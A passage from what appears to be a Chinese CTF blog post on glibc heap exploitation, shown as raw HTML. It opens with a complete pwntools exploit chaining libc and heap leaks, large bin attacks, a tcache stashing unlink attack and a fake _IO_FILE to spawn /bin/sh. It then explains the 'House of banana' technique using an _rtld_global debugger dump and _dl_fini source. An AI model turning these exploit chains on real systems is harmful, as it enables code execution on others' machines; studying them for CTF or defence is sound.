class="string">b&#x27;CbyWU8&#x27;</span>]</span><br><span class="line">current_user = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">content_length, content = <span class="literal">None</span></span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;message size: &#x27;</span>, <span class="built_in">str</span>(content_length).encode())</span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        content = <span class="built_in">str</span>(current_user) * (content_length // <span class="number">0x30</span> * <span class="number">0x10</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">view</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;message: &#x27;</span>, content)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;index: &#x27;</span>, <span class="built_in">str</span>(index).encode())</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">change_role</span>(<span class="params">role</span>):</span><br><span class="line">    <span class="keyword">global</span> current_user</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, password[role])</span><br><span class="line">    current_user = role</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_addr</span>():</span><br><span class="line">    <span class="keyword">global</span> libc_base, system, __free_hook, _IO_list_all, heap_address</span><br><span class="line">    <span class="comment"># 部署tcache stashing unlink attack的堆环境</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):      <span class="comment"># make 5 chunk into tcache, mummy index 0~4</span></span><br><span class="line">        add(<span class="number">0xA0</span>)</span><br><span class="line">        delete(i)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x150</span>)    <span class="comment"># peppa index 0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x120 tcache, peppa index 1~7</span></span><br><span class="line">        add(<span class="number">0x150</span>)</span><br><span class="line">        delete(i + <span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">0</span>)               <span class="comment"># peppa #0 into unsorted bin</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xA0</span>)               <span class="comment"># mummy index 5, split peppa #0</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x160</span>)              <span class="comment"># peppa index 8</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):      <span class="comment"># fill 0x130 tcache, peppa index 9~15</span></span><br><span class="line">        add(<span class="number">0x160</span>)</span><br><span class="line">        delete(i + <span class="number">9</span>)</span><br><span class="line">    delete(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">8</span>)                 <span class="comment"># get libc base address</span></span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    libc_base = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>) - <span class="number">0x1ECBE0</span></span><br><span class="line">    system = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">    __free_hook = libc_base + libc.symbols[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    _IO_list_all = libc_base + libc.symbols[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0xB0</span>)               <span class="comment"># mummy index 6, split peppa #8</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 获取堆地址</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># gdb.attach(io)</span></span><br><span class="line">    <span class="comment"># pause()</span></span><br><span class="line"></span><br><span class="line">    view(<span class="number">1</span>)</span><br><span class="line">    io.recv(<span class="number">0x10</span>)</span><br><span class="line">    heap_address = u64(io.recv(<span class="number">6</span>) + <span class="string">b&#x27;\x00\x00&#x27;</span>)        <span class="comment"># get a heap address</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;libc base: &#x27;</span>, <span class="built_in">hex</span>(libc_base))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;system: &#x27;</span>, <span class="built_in">hex</span>(system))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;__free_hook: &#x27;</span>, <span class="built_in">hex</span>(__free_hook))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;_IO_list_all: &#x27;</span>, <span class="built_in">hex</span>(_IO_list_all))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;heap address: &#x27;</span>, <span class="built_in">hex</span>(heap_address))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">first_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># first large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    add(<span class="number">0x440</span>)     <span class="comment"># mummy index = 7</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 16</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 17</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 18</span></span><br><span class="line">    add(<span class="number">0x430</span>)     <span class="comment"># peppa index = 19</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    delete(<span class="number">7</span>)</span><br><span class="line">    add(<span class="number">0x450</span>)     <span class="comment"># mummy index = 8, switch mummy #7 into large bin</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">17</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(__free_hook - <span class="number">0x18</span> - <span class="number">0x18</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 0, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">second_largebin_attack</span>():</span><br><span class="line">    <span class="comment"># second large bin attack</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    delete(<span class="number">19</span>)</span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, (p64(_IO_list_all - <span class="number">0x20</span>) * <span class="number">2</span>) + <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x440</span> // <span class="number">0x30</span> * <span class="number">0x10</span> - <span class="number">0x10</span>))</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xF0</span>)    <span class="comment"># daddy index = 1, complete first large bin attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tcache_stashing_unlink_attack</span>():</span><br><span class="line">    <span class="comment"># tcache stashing unlink attack</span></span><br><span class="line">    change_role(<span class="number">0</span>)</span><br><span class="line">    edit(<span class="number">8</span>, <span class="string">b&#x27;0&#x27;</span> * <span class="number">0x40</span> + p64(heap_address + <span class="number">0x410</span>) + p64(__free_hook - <span class="number">0x28</span>) + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x230</span>)   <span class="comment"># daddy index = 2</span></span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    add(<span class="number">0x430</span>)   <span class="comment"># daddy index = 3</span></span><br><span class="line">    change_role(<span class="number">1</span>)</span><br><span class="line">    edit(<span class="number">7</span>, p64(heap_address + <span class="number">0x19E0</span>) * <span class="number">2</span> + <span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    change_role(<span class="number">2</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    add(<span class="number">0xA0</span>)   <span class="comment"># daddy index = 4, trigger tcache stashing unlink attack</span></span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">    fake_IO_FILE_complete = p64(<span class="number">0</span>) * <span class="number">2</span>  <span class="comment"># _IO_read_end (0x10), _IO_read_base (0x18)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">1</span>)     <span class="comment"># _IO_write_base (0x20)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0xFFFF_FFFF_FFFF</span>) <span class="comment"># _IO_write_ptr (0x28)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _IO_write_end (0x30)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span>)  <span class="comment"># _IO_buf_base (0x38)</span></span><br><span class="line">    fake_IO_FILE_complete += p64(heap_address + <span class="number">0x19E0</span> + <span class="number">0xD0</span> + <span class="number">30</span>)  <span class="comment"># _IO_buf_end (0x40)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xB0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += p64(<span class="number">0</span>)     <span class="comment"># _mode (0xB0)</span></span><br><span class="line">    fake_IO_FILE_complete = fake_IO_FILE_complete.ljust(<span class="number">0xC0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    fake_IO_FILE_complete += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    fake_IO_FILE_complete += p64(libc_base + <span class="number">0x1E9560</span>)</span><br><span class="line">    payload = fake_IO_FILE_complete + <span class="string">b&#x27;/bin/sh\x00&#x27;</span> + <span class="number">2</span> * p64(system)</span><br><span class="line">    <span class="comment">#gdb.attach(io)</span></span><br><span class="line">    io.sendafter(<span class="string">b&#x27;Gift:&#x27;</span>, payload)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pwn</span>():</span><br><span class="line">    leak_addr()</span><br><span class="line">    first_largebin_attack()</span><br><span class="line">    second_largebin_attack()</span><br><span class="line">    tcache_stashing_unlink_attack()</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;Choice: &#x27;</span>, <span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;user:\n&#x27;</span>, <span class="string">b&#x27;&#x27;</span>)</span><br><span class="line">    io.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pwn()</span><br></pre></td></tr></table></figure></div>

<h1 id="House-of-banana"><a href="#House-of-banana" class="headerlink" title="House of banana"></a>House of banana</h1><p><code>glibc &gt;= 2.23</code></p>
<h2 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h2><p>在 <code>ld.so</code> 里，存在一个 <code>_rtld_global</code> 指针，指向 <code>rtld_global</code> 结构体，程序通过 <code>exit</code> 退出时，会调用 <code>rtld_global</code> 的结构体中的一系列函数来进行诸如恢复寄存器，清除缓冲区等操作。</p>
<p>其<a class="link"   href="https://elixir.bootlin.com/glibc/glibc-2.31/source/sysdeps/generic/ldsodefs.h#L308" >结构体定义 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>如下：</p>
<div class="highlight-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">glibc-2.23</span></span><br><span class="line"><span class="meta prompt_">gdb-peda$ </span><span class="language-bash">p _rtld_global</span></span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">1 = &#123;</span></span><br><span class="line">  _dl_ns = &#123;&#123;</span><br><span class="line">      _ns_loaded = 0x7ffff7ffe168,</span><br><span class="line">      _ns_nloaded = 0x4,</span><br><span class="line">      _ns_main_searchlist = 0x7ffff7ffe420,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x1,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">            __align = 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, &#123;</span><br><span class="line">      _ns_loaded = 0x0,</span><br><span class="line">      _ns_nloaded = 0x0,</span><br><span class="line">      _ns_main_searchlist = 0x0,</span><br><span class="line">      _ns_global_scope_alloc = 0x0,</span><br><span class="line">      _ns_unique_sym_table = &#123;</span><br><span class="line">        lock = &#123;</span><br><span class="line">          mutex = &#123;</span><br><span class="line">            __data = &#123;</span><br><span class="line">              __lock = 0x0,</span><br><span class="line">              __count = 0x0,</span><br><span class="line">              __owner = 0x0,</span><br><span class="line">              __nusers = 0x0,</span><br><span class="line">              __kind = 0x0,</span><br><span class="line">              __spins = 0x0,</span><br><span class="line">              __elision = 0x0,</span><br><span class="line">              __list = &#123;</span><br><span class="line">                __prev = 0x0,</span><br><span class="line">                __next = 0x0</span><br><span class="line">              &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">            __size = &#x27;\000&#x27; &lt;repeats 39 times&gt;,</span><br><span class="line">            __align = 0x0</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        entries = 0x0,</span><br><span class="line">        size = 0x0,</span><br><span class="line">        n_elements = 0x0,</span><br><span class="line">        free = 0x0</span><br><span class="line">      &#125;,</span><br><span class="line">      _ns_debug = &#123;</span><br><span class="line">        r_version = 0x0,</span><br><span class="line">        r_map = 0x0,</span><br><span class="line">        r_brk = 0x0,</span><br><span class="line">        r_state = RT_CONSISTENT,</span><br><span class="line">        r_ldbase = 0x0</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; &lt;repeats 15 times&gt;&#125;,</span><br><span class="line">  _dl_nns = 0x1,</span><br><span class="line">  _dl_load_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_write_lock = &#123;</span><br><span class="line">    mutex = &#123;</span><br><span class="line">      __data = &#123;</span><br><span class="line">        __lock = 0x0,</span><br><span class="line">        __count = 0x0,</span><br><span class="line">        __owner = 0x0,</span><br><span class="line">        __nusers = 0x0,</span><br><span class="line">        __kind = 0x1,</span><br><span class="line">        __spins = 0x0,</span><br><span class="line">        __elision = 0x0,</span><br><span class="line">        __list = &#123;</span><br><span class="line">          __prev = 0x0,</span><br><span class="line">          __next = 0x0</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      __size = &#x27;\000&#x27; &lt;repeats 16 times&gt;, &quot;\001&quot;, &#x27;\000&#x27; &lt;repeats 22 times&gt;,</span><br><span class="line">      __align = 0x0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  _dl_load_adds = 0x4,</span><br><span class="line">  _dl_initfirst = 0x0,</span><br><span class="line">  _dl_cpuclock_offset = 0x117f04aeec,</span><br><span class="line">  _dl_profile_map = 0x0,</span><br><span class="line">  _dl_num_relocations = 0x53,</span><br><span class="line">  _dl_num_cache_relocations = 0x3,</span><br><span class="line">  _dl_all_dirs = 0x7ffff7ffec20,</span><br><span class="line">  _dl_error_catch_tsd = 0x7ffff7dd7c80 &lt;_dl_initial_error_catch_tsd&gt;,</span><br><span class="line">  _dl_rtld_map = &#123;</span><br><span class="line">    l_addr = 0x7ffff7dd7000,</span><br><span class="line">    l_name = 0x3ff2a8 &quot;/root/glibc-all-in-one/libs/2.23-0ubuntu11.3_amd64/ld-2.23.so&quot;,</span><br><span class="line">    l_ld = 0x7ffff7ffce80,</span><br><span class="line">    l_next = 0x0,</span><br><span class="line">    l_prev = 0x7ffff7ff5000,</span><br><span class="line">    l_real = 0x7ffff7ffd9d8 &lt;_rtld_global+2456&gt;,</span><br><span class="line">    l_ns = 0x0,</span><br><span class="line">    l_libname = 0x7ffff7ffe020 &lt;_dl_rtld_libname&gt;,</span><br><span class="line">    l_info = &#123;0x0, 0x0, 0x7ffff7ffcf00, 0x7ffff7ffcef0, 0x7ffff7ffce90,</span><br><span class="line">      0x7ffff7ffceb0, 0x7ffff7ffcec0, 0x7ffff7ffcf30, 0x7ffff7ffcf40,</span><br><span class="line">      0x7ffff7ffcf50, 0x7ffff7ffced0, 0x7ffff7ffcee0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffce80, 0x0, 0x0, 0x0, 0x0, 0x0, 0x7ffff7ffcf10, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf20, 0x0 &lt;repeats 12 times&gt;, 0x7ffff7ffcf70, 0x7ffff7ffcf60,</span><br><span class="line">      0x0, 0x0, 0x7ffff7ffcf90, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0,</span><br><span class="line">      0x7ffff7ffcf80, 0x0 &lt;repeats 25 times&gt;, 0x7ffff7ffcea0&#125;,</span><br><span class="line">    l_phdr = 0x7ffff7dd7040,</span><br><span class="line">    l_entry = 0x0,</span><br><span class="line">    l_phnum = 0x7,</span><br><span class="line">    l_ldnum = 0x0,</span><br><span class="line">    l_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_symbolic_searchlist = &#123;</span><br><span class="line">      r_list = 0x0,</span><br><span class="line">      r_nlist = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_loader = 0x0,</span><br><span class="line">    l_versions = 0x7ffff7ff58b8,</span><br><span class="line">    l_nversions = 0x6,</span><br><span class="line">    l_nbuckets = 0x11,</span><br><span class="line">    l_gnu_bitmask_idxbits = 0x3,</span><br><span class="line">    l_gnu_shift = 0x8,</span><br><span class="line">    l_gnu_bitmask = 0x7ffff7dd72c0,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_buckets = 0x7ffff7dd72e0,</span><br><span class="line">      l_chain = 0x7ffff7dd72e0</span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">      l_gnu_chain_zero = 0x7ffff7dd731c,</span><br><span class="line">      l_buckets = 0x7ffff7dd731c</span><br><span class="line">    &#125;,</span><br><span class="line">    l_direct_opencount = 0x0,</span><br><span class="line">    l_type = lt_library,</span><br><span class="line">    l_relocated = 0x1,</span><br><span class="line">    l_init_called = 0x1,</span><br><span class="line">    l_global = 0x1,</span><br><span class="line">    l_reserved = 0x0,</span><br><span class="line">    l_phdr_allocated = 0x0,</span><br><span class="line">    l_soname_added = 0x0,</span><br><span class="line">    l_faked = 0x0,</span><br><span class="line">    l_need_tls_init = 0x0,</span><br><span class="line">    l_auditing = 0x0,</span><br><span class="line">    l_audit_any_plt = 0x0,</span><br><span class="line">    l_removed = 0x0,</span><br><span class="line">    l_contiguous = 0x0,</span><br><span class="line">    l_symbolic_in_local_scope = 0x0,</span><br><span class="line">    l_free_initfini = 0x0,</span><br><span class="line">    l_rpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_reloc_result = 0x0,</span><br><span class="line">    l_versyms = 0x7ffff7dd77f0,</span><br><span class="line">    l_origin = 0x0,</span><br><span class="line">    l_map_start = 0x7ffff7dd7000,</span><br><span class="line">    l_map_end = 0x7ffff7ffe168,</span><br><span class="line">    l_text_end = 0x7ffff7df57c0,</span><br><span class="line">    l_scope_mem = &#123;0x0, 0x0, 0x0, 0x0&#125;,</span><br><span class="line">    l_scope_max = 0x0,</span><br><span class="line">    l_scope = 0x0,</span><br><span class="line">    l_local_scope = &#123;0x0, 0x0&#125;,</span><br><span class="line">    l_file_id = &#123;</span><br><span class="line">      dev = 0x0,</span><br><span class="line">      ino = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_runpath_dirs = &#123;</span><br><span class="line">      dirs = 0x0,</span><br><span class="line">      malloced = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_initfini = 0x0,</span><br><span class="line">    l_reldeps = 0x0,</span><br><span class="line">    l_reldepsmax = 0x0,</span><br><span class="line">    l_used = 0x1,</span><br><span class="line">    l_feature_1 = 0x0,</span><br><span class="line">    l_flags_1 = 0x0,</span><br><span class="line">    l_flags = 0x0,</span><br><span class="line">    l_idx = 0x0,</span><br><span class="line">    l_mach = &#123;</span><br><span class="line">      plt = 0x0,</span><br><span class="line">      gotplt = 0x0,</span><br><span class="line">      tlsdesc_table = 0x0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_lookup_cache = &#123;</span><br><span class="line">      sym = 0x7ffff7dd7450,</span><br><span class="line">      type_class = 0x1,</span><br><span class="line">      value = 0x7ffff7ff5000,</span><br><span class="line">      ret = 0x7ffff7a13ba0</span><br><span class="line">    &#125;,</span><br><span class="line">    l_tls_initimage = 0x0,</span><br><span class="line">    l_tls_initimage_size = 0x0,</span><br><span class="line">    l_tls_blocksize = 0x0,</span><br><span class="line">    l_tls_align = 0x0,</span><br><span class="line">    l_tls_firstbyte_offset = 0x0,</span><br><span class="line">    l_tls_offset = 0x0,</span><br><span class="line">    l_tls_modid = 0x0,</span><br><span class="line">    l_tls_dtor_count = 0x0,</span><br><span class="line">    l_relro_addr = 0x225bc0,</span><br><span class="line">    l_relro_size = 0x440,</span><br><span class="line">    l_serial = 0x0,</span><br><span class="line">    l_audit = 0x7ffff7ffde48 &lt;_rtld_global+3592&gt;</span><br><span class="line">  &#125;,</span><br><span class="line">  audit_data = &#123;&#123;</span><br><span class="line">      cookie = 0x0,</span><br><span class="line">      bindflags = 0x0</span><br><span class="line">    &#125; &lt;repeats 16 times&gt;&#125;,</span><br><span class="line">  _dl_rtld_lock_recursive = 0x7ffff7dd7c90 &lt;rtld_lock_default_lock_recursive&gt;,</span><br><span class="line">  _dl_rtld_unlock_recursive = 0x7ffff7dd7ca0 &lt;rtld_lock_default_unlock_recursive&gt;,</span><br><span class="line">  _dl_make_stack_executable_hook = 0x7ffff7deb0e0 &lt;__GI__dl_make_stack_executable&gt;,</span><br><span class="line">  _dl_stack_flags = 0x6,</span><br><span class="line">  _dl_tls_dtv_gaps = 0x0,</span><br><span class="line">  _dl_tls_max_dtv_idx = 0x1,</span><br><span class="line">  _dl_tls_dtv_slotinfo_list = 0x7ffff7ff5948,</span><br><span class="line">  _dl_tls_static_nelem = 0x1,</span><br><span class="line">  _dl_tls_static_size = 0x1000,</span><br><span class="line">  _dl_tls_static_used = 0x78,</span><br><span class="line">  _dl_tls_static_align = 0x40,</span><br><span class="line">  _dl_initial_dtv = 0x7ffff7ff3010,</span><br><span class="line">  _dl_tls_generation = 0x1,</span><br><span class="line">  _dl_init_static_tls = 0x7ffff7de3130 &lt;_dl_nothread_init_static_tls&gt;,</span><br><span class="line">  _dl_wait_lookup_done = 0x0,</span><br><span class="line">  _dl_scope_free_list = 0x0</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>我们看到里面有多个 <code>_dl_ns</code> 结构体，调试发现，该结构体存储着的实际就是 <code>elf</code> 各段的符号结构体。当调用到 <code>_dl_fini</code> 函数时，会执行每个 <code>so</code> 中注册的 <code>fini</code> 函数，其中主要是 <code>fini_array</code> 段的动态链接结构体指针，该结构体实际在 <code>_dl_fini</code> 中被使用。</p>
<div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">internal_function</span><br><span class="line">_dl_fini (<span class="type">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* Lots of fun ahead.  We have to call the destructors for all still</span></span><br><span class="line"><span class="comment">     loaded objects, in all namespaces.  The problem is that the ELF</span></span><br><span class="line"><span class="comment">     specification now demands that dependencies between the modules</span></span><br><span class="line"><span class="comment">     are taken into account.  I.e., the destructor for a module is</span></span><br><span class="line"><span class="comment">     called before the ones for any of its dependencies.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     To make things more complicated, we cannot simply use the reverse</span></span><br><span class="line"><span class="comment">     order of the constructors.  Since the user might have loaded objects</span></span><br><span class="line"><span class="comment">     using `dlopen&#x27; there are possibly several other modules with its</span></span><br><span class="line"><span class="comment">     dependencies to be taken into account.  Therefore we have to start</span></span><br><span class="line"><span class="comment">     determining the order of the modules once again from the beginning.  */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We run the destructors of the main namespaces last.  As for the</span></span><br><span class="line"><span class="comment">     other namespaces, we pick run the destructors in them in reverse</span></span><br><span class="line"><span class="comment">     order of the namespace ID.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">  <span class="type">int</span> do_audit = <span class="number">0</span>;</span><br><span class="line"> again:</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  <span class="keyword">for</span> (Lmid_t ns = <span class="built_in">GL</span>(dl_nns) - <span class="number">1</span>; ns &gt;= <span class="number">0</span>; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Protect against concurrent loads and unloads.  